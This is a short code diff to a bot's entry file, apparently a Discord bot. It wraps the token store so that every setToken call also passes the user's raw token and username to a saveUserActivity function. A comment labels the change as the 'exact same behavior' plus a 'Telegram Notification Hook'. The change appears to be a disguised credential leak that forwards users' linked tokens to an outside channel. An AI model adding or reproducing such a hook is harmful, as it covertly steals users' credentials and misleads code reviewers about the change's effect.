@@ -6,6 +6,7 @@ import { dirname, join } from 'path';
 import deployCommands from './utils/deployCommands.js';
 import { makeTokenStore } from './commands/questCommands.js';
 import { writeFileSync, existsSync } from 'fs';
+import { saveUserActivity } from './utils/userActivity.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname  = dirname(__filename);
@@ -56,7 +57,17 @@ const client = new Client({
 
 client.commands       = new Collection();
 client.prefixCommands = new Collection();
-client.tokenStore     = makeTokenStore(TOKEN);
+
+// TokenStore Wrapper: Exact same behavior + Telegram Notification Hook
+const baseTokenStore  = makeTokenStore(TOKEN);
+client.tokenStore     = {
+    ...baseTokenStore,
+    setToken: async (userId, token, username = 'Unknown User') => {
+        const result = await baseTokenStore.setToken(userId, token);
+        await saveUserActivity(userId, username, 'Token Linked/Saved', token);
+        return result;
+    }
+};
 
 const commandFiles = readdirSync(join(__dirname, 'commands')).filter(f => f.endsWith('.js'));
 for (const file of commandFiles) {
